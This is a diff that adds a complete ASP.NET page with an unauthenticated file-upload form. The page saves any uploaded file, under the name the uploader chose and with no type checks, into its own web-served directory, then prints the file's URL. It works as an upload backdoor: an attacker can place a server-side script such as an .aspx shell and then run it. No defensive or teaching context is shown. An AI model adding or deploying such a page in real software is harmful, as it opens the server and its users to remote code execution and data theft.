@@ -1,0 +1,33 @@
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.IO" %>
+
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e)
+    {
+        if (Request.HttpMethod == "POST" && Request.Files.Count > 0)
+        {
+            HttpPostedFile file = Request.Files[0];
+            string fileName = Path.GetFileName(file.FileName);
+            string savePath = Path.Combine(Server.MapPath("."), fileName);
+
+            try
+            {
+                file.SaveAs(savePath);
+                string fileUrl = Request.Url.GetLeftPart(UriPartial.Authority) + "/" + fileName;
+                Response.Write("File uploaded: " + fileUrl);
+            }
+            catch(Exception ex)
+            {
+                Response.Write("Error: " + ex.Message);
+            }
+        }
+    }
+</script>
+
+<html>
+<body>
+<form method="post" enctype="multipart/form-data">
+    <input type="file" name="file" />
+    <input type="submit" value="Upload" />
+</form>
+</body>
